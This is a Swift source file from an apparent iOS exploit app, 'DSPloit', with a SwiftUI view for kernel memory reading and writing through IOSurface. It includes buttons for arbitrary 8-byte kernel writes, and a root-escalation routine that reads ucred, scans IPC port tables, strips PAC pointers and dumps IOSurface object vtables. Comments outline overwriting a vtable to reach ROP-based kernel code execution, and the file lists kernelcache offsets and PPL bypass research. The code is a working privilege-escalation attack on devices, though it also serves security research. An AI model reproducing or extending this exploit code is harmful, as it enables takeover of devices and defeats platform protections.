//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        let task = ds_get_our_task()
        guard task != 0 else { rootResult = "task = 0"; return }
        
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        let origUid = ds_kread32(ucred + 0x18)
        
        var report = ""
        report += String(format: "proc:     0x%llx\n", proc)
        report += String(format: "task:     0x%llx\n", task)
        report += String(format: "proc_ro:  0x%llx\n", procRo)
        report += String(format: "ucred:    0x%llx\n", ucred)
        report += String(format: "orig uid: %d\n", origUid)
        report += String(format: "surface:  ID=%d, map=0x%llx\n\n", engine.surfaceID, engine.mappedAddress)
        
        // ============================================================
        // EXPERIMENT: Find IOSurface kernel object in heap
        // IOSurface objects have their ID stored somewhere in the struct
        // We scan heap near task/proc for our surface ID
        // ============================================================
        
        report += "=== EXPERIMENT: FIND IOSURFACE KERNEL OBJECT ===\n"
        report += String(format: "Looking for surface ID=%d (0x%x) in kernel heap...\n\n", engine.surfaceID, engine.surfaceID)
        
        // Strategy: IOSurface objects are allocated in IOKit zones
        // They're typically near other IOKit objects
        // Scan around task port area (ipc_space → ports → IOSurface connection)
        
        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
        let isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        
        report += String(format: "itk_space: 0x%llx\n", itkSpace)
        report += String(format: "is_table:  0x%llx\n\n", isTable)
        
        // Scan IPC port table entries for IOSurface port
        // Each entry is sizeof_ipc_entry bytes
        let entrySize = UInt64(sizeof_ipc_entry)
        var iosurfacePort: UInt64 = 0
        var iosurfaceKobject: UInt64 = 0
        
        report += "Scanning IPC port table (first 200 entries)...\n"
        for i in 0..<200 {
            let entryAddr = isTable + UInt64(i) * entrySize
            let portPtr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
            if portPtr == 0 { continue }
            
            // Strip PAC using kernel's pac_mask
            let port = portPtr | pac_mask
            guard ds_isvalid(port) else { continue }
            
            // Read kobject from port
            let kobject = ds_kread64(port + UInt64(off_ipc_port_ip_kobject))
            if kobject == 0 { continue }
            let kobj = kobject | pac_mask
            guard ds_isvalid(kobj) else { continue }
            
            // Check if this kobject contains our surface ID
            // IOSurface ID is typically at offset 0x10-0x20 in the object
            for off in stride(from: 0, to: 0x40, by: 4) {
                let val = ds_kread32(kobj + UInt64(off))
                if val == engine.surfaceID && engine.surfaceID != 0 {
                    iosurfacePort = port
                    iosurfaceKobject = kobj
                    report += String(format: "  FOUND! port[%d]=0x%llx kobject=0x%llx (ID at +0x%x)\n", i, port, kobj, off)
                    break
                }
            }
            if iosurfaceKobject != 0 { break }
        }
        
        if iosurfaceKobject == 0 {
            report += "  IOSurface object not found in first 200 ports.\n"
            report += "  Trying scan near known heap objects...\n\n"
            
            // Scan near proc for surface ID (safe — these are known heap addresses)
            let scanRange: UInt64 = 0x2000
            let scanBases: [(String, UInt64)] = [
                ("proc", proc),
                ("task", task),
            ]
            
            for (name, base) in scanBases {
                guard base > scanRange else { continue }
                let scanStart = base - 0x1000
                for off in stride(from: 0, to: Int(scanRange), by: 4) {
                    let addr = scanStart + UInt64(off)
                    guard ds_isvalid(addr) else { continue }
                    let val = ds_kread32(addr)
                    if val == engine.surfaceID && engine.surfaceID != 0 {
                        report += String(format: "  FOUND at %@-0x1000+0x%x (addr=0x%llx)\n", name, off, addr)
                        // Try to find object start (look for vtable-like pointer before)
                        let possibleStart = addr - UInt64(off % 0x100)
                        if ds_isvalid(possibleStart) {
                            iosurfaceKobject = possibleStart
                        }
                    }
                }
                if iosurfaceKobject != 0 { break }
            }
        }
        
        // ============================================================
        // If found: dump IOSurface object structure
        // ============================================================
        
        if iosurfaceKobject != 0 {
            report += String(format: "\n=== IOSURFACE OBJECT DUMP (0x%llx) ===\n", iosurfaceKobject)
            
            // Dump first 0x80 bytes (vtable + fields)
            for i in stride(from: 0, to: 0x80, by: 8) {
                let val = ds_kread64(iosurfaceKobject + UInt64(i))
                let marker: String
                if i == 0 { marker = " ← vtable?" }
                else if val == UInt64(engine.surfaceID) { marker = " ← surface ID" }
                else if val == engine.mappedAddress { marker = " ← mapped addr?" }
                else { marker = "" }
                report += String(format: "  +0x%02x: 0x%016llx%@\n", i, val, marker)
            }
            
            report += "\n→ If vtable found, next step: overwrite vtable entry\n"
            report += "→ Point to ROP gadget → kernel code execution → root\n"
        } else {
            report += "\n=== IOSURFACE NOT FOUND ===\n"
            report += "Surface ID not found in scanned heap regions.\n"
            report += "May need to scan more broadly or use different technique.\n"
        }
        
        report += "\n=== EXPERIMENT COMPLETE ===\n"
        rootResult = report
    }
}
